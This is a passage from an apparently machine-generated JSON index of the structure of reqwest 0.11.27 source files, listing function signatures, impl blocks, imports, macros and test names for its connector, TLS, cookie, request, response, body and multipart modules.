          "fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context) -> Poll<Result<(), io::Error>> {",
          "fn tunnel_eof() -> BoxError {",
          "fn connected(&self) -> Connected {",
          "fn connected(&self) -> Connected {",
          "fn poll_read(",
          "fn poll_write(",
          "fn poll_write_vectored(",
          "fn is_write_vectored(&self) -> bool {",
          "fn poll_flush(",
          "fn poll_shutdown(",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn connected(&self) -> Connected {",
          "fn poll_read(",
          "fn poll_write(",
          "fn poll_write_vectored(",
          "fn is_write_vectored(&self) -> bool {",
          "fn poll_flush(",
          "fn poll_shutdown(",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn connected(&self) -> Connected {",
          "fn poll_read(",
          "fn poll_write(",
          "fn poll_write_vectored(",
          "fn is_write_vectored(&self) -> bool {",
          "fn poll_flush(",
          "fn poll_shutdown(",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn ua() -> Option<http::header::HeaderValue> {",
          "fn test_tunnel() {",
          "fn test_tunnel_eof() {",
          "fn test_tunnel_non_http_response() {",
          "fn test_tunnel_proxy_unauthorized() {",
          "fn test_tunnel_basic_auth() {"
        ],
        "struct_defs": [
          "struct Verbose<T> {",
          "struct Escape<'a>(&'a [u8]);",
          "struct Vectored<'a, 'b> {"
        ],
        "impl_blocks": [
          "impl Connector {",
          "impl Service<Uri> for Connector {",
          "impl TlsInfoFactory for tokio::net::TcpStream {",
          "impl TlsInfoFactory for hyper_tls::MaybeHttpsStream<tokio::net::TcpStream> {",
          "impl TlsInfoFactory for hyper_tls::TlsStream<hyper_tls::MaybeHttpsStream<tokio::net::TcpStream>> {",
          "impl TlsInfoFactory for tokio_native_tls::TlsStream<tokio::net::TcpStream> {",
          "impl TlsInfoFactory for hyper_rustls::MaybeHttpsStream<tokio::net::TcpStream> {",
          "impl TlsInfoFactory for tokio_rustls::TlsStream<tokio::net::TcpStream> {",
          "impl TlsInfoFactory",
          "impl TlsInfoFactory for tokio_rustls::client::TlsStream<tokio::net::TcpStream> {",
          "impl Connection for Conn {",
          "impl AsyncRead for Conn {",
          "impl AsyncWrite for Conn {",
          "impl TlsInfoFactory for NativeTlsConn<tokio::net::TcpStream> {",
          "impl TlsInfoFactory for NativeTlsConn<hyper_tls::MaybeHttpsStream<tokio::net::TcpStream>> {",
          "impl TlsInfoFactory for RustlsTlsConn<tokio::net::TcpStream> {",
          "impl TlsInfoFactory for RustlsTlsConn<hyper_rustls::MaybeHttpsStream<tokio::net::TcpStream>> {",
          "impl Wrapper {",
          "impl fmt::Debug for Escape<'_> {",
          "impl fmt::Debug for Vectored<'_, '_> {"
        ],
        "uses": [
          "use http::header::HeaderValue;",
          "use http::uri::{Authority, Scheme};",
          "use http::Uri;",
          "use hyper::client::connect::{Connected, Connection};",
          "use hyper::service::Service;",
          "use native_tls_crate::{TlsConnector, TlsConnectorBuilder};",
          "use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};",
          "use pin_project_lite::pin_project;",
          "use std::future::Future;",
          "use std::io::{self, IoSlice};",
          "use std::net::IpAddr;",
          "use std::pin::Pin;",
          "use std::sync::Arc;",
          "use std::task::{Context, Poll};",
          "use std::time::Duration;",
          "use self::native_tls_conn::NativeTlsConn;",
          "use self::rustls_tls_conn::RustlsTlsConn;",
          "use crate::dns::DynResolver;",
          "use crate::error::BoxError;",
          "use crate::proxy::{Proxy, ProxyScheme};",
          "use std::convert::TryFrom;",
          "use tokio_rustls::TlsConnector as RustlsConnector;",
          "use rustls::ServerName;",
          "use std::convert::TryFrom;",
          "use tokio_rustls::TlsConnector as RustlsConnector;",
          "use tokio::io::{AsyncReadExt, AsyncWriteExt};",
          "use super::TlsInfoFactory;",
          "use hyper::client::connect::{Connected, Connection};",
          "use pin_project_lite::pin_project;",
          "use std::{",
          "use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};",
          "use tokio_native_tls::TlsStream;",
          "use super::TlsInfoFactory;",
          "use hyper::client::connect::{Connected, Connection};",
          "use pin_project_lite::pin_project;",
          "use std::{",
          "use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};",
          "use tokio_rustls::client::TlsStream;",
          "use std::io;",
          "use std::net::ToSocketAddrs;",
          "use http::Uri;",
          "use tokio::net::TcpStream;",
          "use tokio_socks::tcp::Socks5Stream;",
          "use super::{BoxError, Scheme};",
          "use crate::proxy::ProxyScheme;",
          "use hyper::client::connect::{Connected, Connection};",
          "use std::cmp::min;",
          "use std::fmt;",
          "use std::io::{self, IoSlice};",
          "use std::pin::Pin;",
          "use std::task::{Context, Poll};",
          "use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};",
          "use super::tunnel;",
          "use crate::proxy;",
          "use std::io::{Read, Write};",
          "use std::net::TcpListener;",
          "use std::thread;",
          "use tokio::net::TcpStream;",
          "use tokio::runtime;"
        ],
        "macros": [
          "unreachable!(\"connect_socks is only called for socks proxies\");",
          "log::debug!(\"proxy({proxy_scheme:?}) intercepts '{dst:?}'\");",
          "log::trace!(\"tunneling HTTPS over proxy\");",
          "log::trace!(\"tunneling HTTPS over proxy\");",
          "log::debug!(\"starting new connection: {dst:?}\");",
          "let mut buf = format!(",
          "log::debug!(\"tunnel to {host}:{port} using basic auth\");",
          "_ => unreachable!(),",
          ".map_err(|e| format!(\"socks connect error: {e}\"))?",
          ".map_err(|e| format!(\"socks connect error: {e}\"))?",
          "if self.0 && log::log_enabled!(log::Level::Trace) {",
          "log::trace!(\"{:08x} read: {:?}\", self.id, Escape(buf.filled()));",
          "log::trace!(\"{:08x} write: {:?}\", self.id, Escape(&buf[..n]));",
          "log::trace!(",
          "write!(f, \"b\\\"\")?;",
          "write!(f, \"\\\\n\")?;",
          "write!(f, \"\\\\r\")?;",
          "write!(f, \"\\\\t\")?;",
          "write!(f, \"\\\\{}\", c as char)?;",
          "write!(f, \"\\\\0\")?;",
          "write!(f, \"{}\", c as char)?;",
          "write!(f, \"\\\\x{c:02x}\")?;",
          "write!(f, \"\\\"\")?;",
          "mock_tunnel!(TUNNEL_OK)",
          "mock_tunnel!($write, \"\")",
          "let connect_expected = format!(",
          "assert_eq!(&buf[..n], &connect_expected[..]);",
          "let addr = mock_tunnel!();",
          "let addr = mock_tunnel!(b\"HTTP/1.1 200 OK\");",
          "let addr = mock_tunnel!(b\"foo bar baz hallo\");",
          "let addr = mock_tunnel!(",
          "assert_eq!(error.to_string(), \"proxy authentication required\");",
          "let addr = mock_tunnel!("
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 72
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/into_url.rs",
        "function_defs": [
          "fn into_url(self) -> crate::Result<Url>;",
          "fn as_str(&self) -> &str;",
          "fn into_url(self) -> crate::Result<Url> {",
          "fn as_str(&self) -> &str {",
          "fn into_url(self) -> crate::Result<Url> {",
          "fn as_str(&self) -> &str {",
          "fn into_url(self) -> crate::Result<Url> {",
          "fn as_str(&self) -> &str {",
          "fn into_url(self) -> crate::Result<Url> {",
          "fn as_str(&self) -> &str {",
          "fn into_url_file_scheme() {",
          "fn into_url_blob_scheme() {",
          "fn into_url_blob_scheme_wasm() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl IntoUrl for Url {}",
          "impl IntoUrl for String {}",
          "impl IntoUrlSealed for Url {"
        ],
        "uses": [
          "use url::Url;",
          "use super::*;",
          "use wasm_bindgen_test::*;"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(url.as_str(), \"blob:http://example.com\");"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/tls.rs",
        "function_defs": [
          "fn read_pem_certs(reader: &mut impl BufRead) -> crate::Result<Vec<Vec<u8>>> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn default() -> TlsBackend {",
          "fn verify_server_cert(",
          "fn verify_tls12_signature(",
          "fn verify_tls13_signature(",
          "fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {",
          "fn certificate_from_der_invalid() {",
          "fn certificate_from_pem_invalid() {",
          "fn identity_from_pkcs12_der_invalid() {",
          "fn identity_from_pkcs8_pem_invalid() {",
          "fn identity_from_pem_invalid() {",
          "fn identity_from_pem_pkcs1_key() {",
          "fn certificates_from_pem_bundle() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Certificate {",
          "impl Identity {",
          "impl fmt::Debug for Certificate {",
          "impl fmt::Debug for Identity {",
          "impl Version {",
          "impl fmt::Debug for TlsBackend {",
          "impl Default for TlsBackend {",
          "impl ServerCertVerifier for NoVerifier {",
          "impl TlsInfo {",
          "impl std::fmt::Debug for TlsInfo {"
        ],
        "uses": [
          "use rustls::{",
          "use std::{",
          "use std::io::Cursor;",
          "use std::io::Cursor;",
          "use super::*;"
        ],
        "macros": [
          "TlsBackend::Default => write!(f, \"Default\"),",
          "TlsBackend::BuiltNativeTls(_) => write!(f, \"BuiltNativeTls\"),",
          "TlsBackend::Rustls => write!(f, \"Rustls\"),",
          "TlsBackend::BuiltRustls(_) => write!(f, \"BuiltRustls\"),",
          "TlsBackend::UnknownPreconfigured => write!(f, \"UnknownPreconfigured\"),",
          "assert!(Certificate::from_pem_bundle(PEM_BUNDLE).is_ok())"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]",
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 35
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/cookie.rs",
        "function_defs": [
          "fn set_cookies(&self, cookie_headers: &mut dyn Iterator<Item = &HeaderValue>, url: &url::Url);",
          "fn cookies(&self, url: &url::Url) -> Option<HeaderValue>;",
          "fn parse(value: &'a HeaderValue) -> Result<Cookie<'a>, CookieParseError> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn set_cookies(&self, cookie_headers: &mut dyn Iterator<Item = &HeaderValue>, url: &url::Url) {",
          "fn cookies(&self, url: &url::Url) -> Option<HeaderValue> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl std::error::Error for CookieParseError {}",
          "impl Jar {",
          "impl CookieStore for Jar {"
        ],
        "uses": [
          "use std::convert::TryInto;",
          "use std::fmt;",
          "use std::sync::RwLock;",
          "use std::time::SystemTime;",
          "use crate::header::{HeaderValue, SET_COOKIE};",
          "use bytes::Bytes;"
        ],
        "macros": [
          ".map(|(name, value)| format!(\"{name}={value}\"))"
        ],
        "derives": [
          "#[derive(Debug, Default)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/response.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(r: http::Response<T>) -> Response {",
          "fn from(r: Response) -> Body {",
          "fn test_from_http_response() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Response {",
          "impl fmt::Debug for Response {",
          "impl From<Response> for Body {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::net::SocketAddr;",
          "use std::pin::Pin;",
          "use bytes::Bytes;",
          "use encoding_rs::{Encoding, UTF_8};",
          "use futures_util::stream::StreamExt;",
          "use hyper::client::connect::HttpInfo;",
          "use hyper::{HeaderMap, StatusCode, Version};",
          "use mime::Mime;",
          "use serde::de::DeserializeOwned;",
          "use serde_json;",
          "use tokio::time::Sleep;",
          "use url::Url;",
          "use super::body::Body;",
          "use super::decoder::{Accepts, Decoder};",
          "use crate::cookie;",
          "use crate::response::ResponseUrl;",
          "use hyper::body::HttpBody;",
          "use super::Response;",
          "use crate::ResponseBuilderExt;",
          "use http::response::Builder;",
          "use url::Url;"
        ],
        "macros": [
          "/// println!(\"text: {content:?}\");",
          "/// println!(\"text: {content:?}\");",
          "/// println!(\"ip: {}\", ip.origin);",
          "/// println!(\"bytes: {bytes:?}\");",
          "///     println!(\"Chunk: {chunk:?}\");",
          "///     println!(\"Chunk: {:?}\", item?);",
          "///             assert_eq!(",
          "///             assert_eq!(",
          "assert_eq!(response.status(), 200);",
          "assert_eq!(*response.url(), url);"
        ],
        "derives": [],
        "error_handling": 24
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/request.rs",
        "function_defs": [
          "fn header_sensitive<K, V>(mut self, key: K, value: V, sensitive: bool) -> RequestBuilder",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt_request_fields<'a, 'b>(",
          "fn try_from(req: HttpRequest<T>) -> crate::Result<Self> {",
          "fn try_from(req: Request) -> crate::Result<Self> {",
          "fn add_query_append() {",
          "fn add_query_append_same() {",
          "fn add_query_struct() {",
          "fn add_query_map() {",
          "fn test_replace_headers() {",
          "fn normalize_empty_query() {",
          "fn try_clone_reusable() {",
          "fn try_clone_no_body() {",
          "fn try_clone_stream() {",
          "fn convert_url_authority_into_basic_auth() {",
          "fn test_basic_auth_sensitive_header() {",
          "fn test_bearer_auth_sensitive_header() {",
          "fn test_explicit_sensitive_header() {",
          "fn convert_from_http_request() {",
          "fn set_http_request_version() {",
          "fn builder_split_reassemble() {",
          "fn basic_get_request() {",
          "fn basic_head_request() {",
          "fn basic_post_request() {",
          "fn basic_put_request() {",
          "fn basic_patch_request() {",
          "fn basic_delete_request() {",
          "fn add_header() {",
          "fn add_headers() {",
          "fn add_headers_multi() {",
          "fn add_body() {",
          "fn add_form() {",
          "fn add_json() {",
          "fn add_json_fail() {",
          "fn serialize<S>(&self, _serializer: S) -> Result<S::Ok, S::Error>"
        ],
        "struct_defs": [
          "struct Params {",
          "struct MyStruct;"
        ],
        "impl_blocks": [
          "impl Request {",
          "impl RequestBuilder {",
          "impl fmt::Debug for Request {",
          "impl fmt::Debug for RequestBuilder {",
          "impl TryFrom<Request> for HttpRequest<Body> {",
          "impl Serialize for MyStruct {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use std::future::Future;",
          "use std::time::Duration;",
          "use serde::Serialize;",
          "use serde_json;",
          "use super::body::Body;",
          "use super::client::{Client, Pending};",
          "use super::multipart;",
          "use super::response::Response;",
          "use crate::header::CONTENT_LENGTH;",
          "use crate::header::{HeaderMap, HeaderName, HeaderValue, CONTENT_TYPE};",
          "use crate::{Method, Url};",
          "use http::{request::Parts, Request as HttpRequest, Version};",
          "use percent_encoding::percent_decode;",
          "use super::{Client, HttpRequest, Request, RequestBuilder, Version};",
          "use crate::Method;",
          "use serde::Serialize;",
          "use std::collections::BTreeMap;",
          "use std::convert::TryFrom;",
          "use http::HeaderMap;",
          "use {body, Method};",
          "use super::Client;",
          "use header::{Host, Headers, ContentType};",
          "use std::collections::HashMap;",
          "use serde_urlencoded;",
          "use serde_json;",
          "use serde::{Serialize, Serializer};",
          "use serde::ser::Error;"
        ],
        "macros": [
          "let header_value = format!(\"Bearer {token}\");",
          "format!(\"multipart/form-data; boundary={}\", multipart.boundary()).as_str(),",
          "/// assert!(clone.is_some());",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=3\"));",
          "assert_eq!(req.url().query(), Some(\"foo=a&foo=b\"));",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=3\"));",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=three\"));",
          "assert_eq!(req.headers()[\"im-a\"], \"keeper\");",
          "assert_eq!(foo.len(), 2);",
          "assert_eq!(foo[0], \"bar\");",
          "assert_eq!(foo[1], \"baz\");",
          "assert_eq!(req.url().query(), None);",
          "assert_eq!(req.url().as_str(), \"https://google.com/\");",
          "assert_eq!(req.url().as_str(), \"http://httpbin.org/post\");",
          "assert_eq!(req.method(), Method::POST);",
          "assert_eq!(req.headers()[\"foo\"], \"bar\");",
          "assert_eq!(req.url().as_str(), \"http://httpbin.org/get\");",
          "assert_eq!(req.method(), Method::GET);",
          "assert!(req.body().is_none());",
          "assert!(clone.is_none());",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(",
          "assert!(req.headers()[\"authorization\"].is_sensitive());",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(req.headers()[\"authorization\"], \"Bearer Hold my bear\");",
          "assert!(req.headers()[\"authorization\"].is_sensitive());",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(req.headers()[\"hiding\"], \"in plain sight\");",
          "assert!(req.headers()[\"hiding\"].is_sensitive());",
          "assert!(req.body().is_some());",
          "assert_eq!(req.body().unwrap().as_bytes(), Some(&test_data[..]));",
          "assert_eq!(headers.get(\"User-Agent\").unwrap(), \"my-awesome-agent/1.0\");",
          "assert_eq!(req.method(), Method::GET);",
          "assert_eq!(req.url().as_str(), \"http://localhost/\");",
          "assert!(req.body().is_some());",
          "assert_eq!(req.body().unwrap().as_bytes(), Some(&test_data[..]));",
          "assert_eq!(headers.get(\"User-Agent\").unwrap(), \"my-awesome-agent/1.0\");",
          "assert_eq!(req.method(), Method::GET);",
          "assert_eq!(req.url().as_str(), \"http://localhost/\");",
          "assert_eq!(req.version(), Version::HTTP_11);",
          "assert_eq!(r.method, Method::Get);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.method, Method::Head);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.method, Method::Post);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.method, Method::Put);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.method, Method::Patch);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.method, Method::Delete);",
          "assert_eq!(r.url.as_str(), some_url);",
          "assert_eq!(r.headers.get::<Host>(), Some(&header));",
          "assert_eq!(r.headers, headers);",
          "assert_eq!(r.headers, headers);",
          "assert_eq!(buf, body);",
          "assert_eq!(r.headers.get::<ContentType>(),",
          "assert_eq!(buf, body_should_be);",
          "assert_eq!(r.headers.get::<ContentType>(), Some(&ContentType::json()));",
          "assert_eq!(buf, body_should_be);",
          "assert!(r.json(&json_data).unwrap_err().is_serialization());"
        ],
        "derives": [
          "#[derive(Serialize)]"
        ],
        "error_handling": 64
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/upgrade.rs",
        "function_defs": [
          "fn poll_read(",
          "fn poll_write(",
          "fn poll_write_vectored(",
          "fn poll_flush(mut self: Pin<&mut Self>, cx: &mut task::Context<'_>) -> Poll<io::Result<()>> {",
          "fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut task::Context<'_>) -> Poll<io::Result<()>> {",
          "fn is_write_vectored(&self) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(inner: hyper::upgrade::Upgraded) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl AsyncRead for Upgraded {",
          "impl AsyncWrite for Upgraded {",
          "impl fmt::Debug for Upgraded {",
          "impl From<hyper::upgrade::Upgraded> for Upgraded {",
          "impl super::response::Response {"
        ],
        "uses": [
          "use std::pin::Pin;",
          "use std::task::{self, Poll};",
          "use std::{fmt, io};",
          "use futures_util::TryFutureExt;",
          "use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/client.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn user_agent(headers: &HeaderMap) -> Option<HeaderValue> {",
          "fn default() -> Self {",
          "fn proxy_auth(&self, dst: &Uri, headers: &mut HeaderMap) {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn poll_ready(&mut self, _cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {",
          "fn call(&mut self, req: Request) -> Self::Future {",
          "fn poll_ready(&mut self, _cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {",
          "fn call(&mut self, req: Request) -> Self::Future {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt_fields(&self, f: &mut fmt::DebugStruct<'_, '_>) {",
          "fn fmt_fields(&self, f: &mut fmt::DebugStruct<'_, '_>) {",
          "fn in_flight(self: Pin<&mut Self>) -> Pin<&mut ResponseFuture> {",
          "fn timeout(self: Pin<&mut Self>) -> Pin<&mut Option<Pin<Box<Sleep>>>> {",
          "fn urls(self: Pin<&mut Self>) -> &mut Vec<Url> {",
          "fn headers(self: Pin<&mut Self>) -> &mut HeaderMap {",
          "fn retry_error(mut self: Pin<&mut Self>, err: &(dyn std::error::Error + 'static)) -> bool {",
          "fn is_retryable_error(err: &(dyn std::error::Error + 'static)) -> bool {",
          "fn inner(self: Pin<&mut Self>) -> Pin<&mut PendingInner> {",
          "fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {",
          "fn poll(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn make_referer(next: &Url, previous: &Url) -> Option<HeaderValue> {",
          "fn add_cookie_header(headers: &mut HeaderMap, cookie_store: &dyn cookie::CookieStore, url: &Url) {"
        ],
        "struct_defs": [
          "struct Config {",
          "struct ClientRef {",
          "struct PendingRequest {"
        ],
        "impl_blocks": [
          "impl Default for ClientBuilder {",
          "impl ClientBuilder {",
          "impl Default for Client {",
          "impl Client {",
          "impl fmt::Debug for Client {",
          "impl tower_service::Service<Request> for Client {",
          "impl tower_service::Service<Request> for &'_ Client {",
          "impl fmt::Debug for ClientBuilder {",
          "impl Config {",
          "impl ClientRef {",
          "impl PendingRequest {",
          "impl Pending {",
          "impl Future for Pending {",
          "impl Future for PendingRequest {",
          "impl fmt::Debug for Pending {"
        ],
        "uses": [
          "use std::any::Any;",
          "use std::net::IpAddr;",
          "use std::sync::Arc;",
          "use std::time::Duration;",
          "use std::{collections::HashMap, convert::TryInto, net::SocketAddr};",
          "use std::{fmt, str};",
          "use bytes::Bytes;",
          "use http::header::{",
          "use http::uri::Scheme;",
          "use http::Uri;",
          "use hyper::client::{HttpConnector, ResponseFuture as HyperResponseFuture};",
          "use native_tls_crate::TlsConnector;",
          "use pin_project_lite::pin_project;",
          "use std::future::Future;",
          "use std::pin::Pin;",
          "use std::task::{Context, Poll};",
          "use tokio::time::Sleep;",
          "use super::decoder::Accepts;",
          "use super::request::{Request, RequestBuilder};",
          "use super::response::Response;",
          "use super::Body;",
          "use crate::async_impl::h3_client::connect::H3Connector;",
          "use crate::async_impl::h3_client::{H3Client, H3ResponseFuture};",
          "use crate::connect::Connector;",
          "use crate::cookie;",
          "use crate::dns::hickory::HickoryDnsResolver;",
          "use crate::dns::{gai::GaiResolver, DnsResolverWithOverrides, DynResolver, Resolve};",
          "use crate::error;",
          "use crate::into_url::try_uri;",
          "use crate::redirect::{self, remove_sensitive_headers};",
          "use crate::tls::{self, TlsBackend};",
          "use crate::Certificate;",
          "use crate::Identity;",
          "use crate::{IntoUrl, Method, Proxy, StatusCode, Url};",
          "use log::{debug, trace};",
          "use quinn::TransportConfig;",
          "use quinn::VarInt;",
          "use crate::tls::NoVerifier;",
          "use rustls::OwnedTrustAnchor;"
        ],
        "macros": [
          "hickory_dns: cfg!(feature = \"hickory-dns\"),",
          "true => unreachable!(\"hickory-dns shouldn't be enabled unless the feature is\"),",
          "log::warn!(",
          "if matches!(config.http_version_pref, HttpVersionPref::Http2) {",
          "/// static APP_USER_AGENT: &str = concat!(",
          "///     env!(\"CARGO_PKG_NAME\"),",
          "///     env!(\"CARGO_PKG_VERSION\"),",
          "if matches!(self.http_version_pref, HttpVersionPref::Http1) {",
          "if matches!(self.http_version_pref, HttpVersionPref::Http2) {",
          "trace!(\"can retry {err:?}\");",
          "debug!(\"error was retryable, but body not reusable\");",
          "trace!(\"retry count too high\");",
          "debug!(\"determining if HTTP/3 error {err} can be retried\");",
          "debug!(\"Location header had invalid URI: {val:?}\");",
          "debug!(\"redirecting '{}' to '{}'\", self.url, loc);",
          "debug!(\"redirect policy disallowed redirection to '{loc}'\");",
          "assert!(result.is_err());",
          "assert!(err.is_builder());",
          "assert_eq!(url_str, err.url().unwrap().as_str());",
          "assert!(result.is_err());",
          "assert!(err.is_builder());",
          "assert_eq!(url_str, err.url().unwrap().as_str());"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 59
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/body.rs",
        "function_defs": [
          "fn from(body: hyper::Body) -> Body {",
          "fn from(bytes: Bytes) -> Body {",
          "fn from(vec: Vec<u8>) -> Body {",
          "fn from(s: &'static [u8]) -> Body {",
          "fn from(s: String) -> Body {",
          "fn from(s: &'static str) -> Body {",
          "fn from(file: File) -> Body {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn poll_data(",
          "fn poll_trailers(",
          "fn is_end_stream(&self) -> bool {",
          "fn size_hint(&self) -> http_body::SizeHint {",
          "fn poll_next(self: Pin<&mut Self>, cx: &mut Context) -> Poll<Option<Self::Item>> {",
          "fn poll_data(",
          "fn poll_trailers(",
          "fn poll_data(",
          "fn poll_trailers(",
          "fn is_end_stream(&self) -> bool {",
          "fn size_hint(&self) -> http_body::SizeHint {",
          "fn test_as_bytes() {"
        ],
        "struct_defs": [
          "struct WrapStream<S> {",
          "struct WrapHyper(hyper::Body);"
        ],
        "impl_blocks": [
          "impl Body {",
          "impl From<hyper::Body> for Body {",
          "impl From<Bytes> for Body {",
          "impl From<Vec<u8>> for Body {",
          "impl From<&'static [u8]> for Body {",
          "impl From<String> for Body {",
          "impl From<&'static str> for Body {",
          "impl From<File> for Body {",
          "impl fmt::Debug for Body {",
          "impl HttpBody for ImplStream {",
          "impl Stream for ImplStream {",
          "impl HttpBody for WrapHyper {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::future::Future;",
          "use std::pin::Pin;",
          "use std::task::{Context, Poll};",
          "use bytes::Bytes;",
          "use futures_core::Stream;",
          "use http_body::Body as HttpBody;",
          "use pin_project_lite::pin_project;",
          "use sync_wrapper::SyncWrapper;",
          "use tokio::fs::File;",
          "use tokio::time::Sleep;",
          "use tokio_util::io::ReaderStream;",
          "use futures_util::TryStreamExt;",
          "use super::Body;"
        ],
        "macros": [
          "futures_core::ready!(Pin::new(body).poll_data(cx))",
          "let item = futures_core::ready!(self.project().inner.get_pin_mut().poll_next(cx)",
          "assert_eq!(body.as_bytes(), Some(&test_data[..]));"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/multipart.rs",
        "function_defs": [
          "fn value_len(&self) -> Option<u64>;",
          "fn metadata(&self) -> &PartMetadata;",
          "fn default() -> Self {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn new(value: Body, body_length: Option<u64>) -> Part {",
          "fn mime(self, mime: Mime) -> Part {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn value_len(&self) -> Option<u64> {",
          "fn metadata(&self) -> &PartMetadata {",
          "fn take_fields(&mut self) -> Vec<(Cow<'static, str>, P)> {",
          "fn percent_encode<'a>(&self, value: &'a str) -> Cow<'a, str> {",
          "fn gen_boundary() -> String {",
          "fn form_empty() {",
          "fn stream_to_end() {",
          "fn stream_to_end_with_header() {",
          "fn correct_content_length() {",
          "fn header_percent_encoding() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Default for Form {",
          "impl Form {",
          "impl fmt::Debug for Form {",
          "impl Part {",
          "impl fmt::Debug for Part {",
          "impl PartProps for Part {",
          "impl PartMetadata {",
          "impl PartMetadata {",
          "impl PercentEncoding {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use std::pin::Pin;",
          "use bytes::Bytes;",
          "use mime_guess::Mime;",
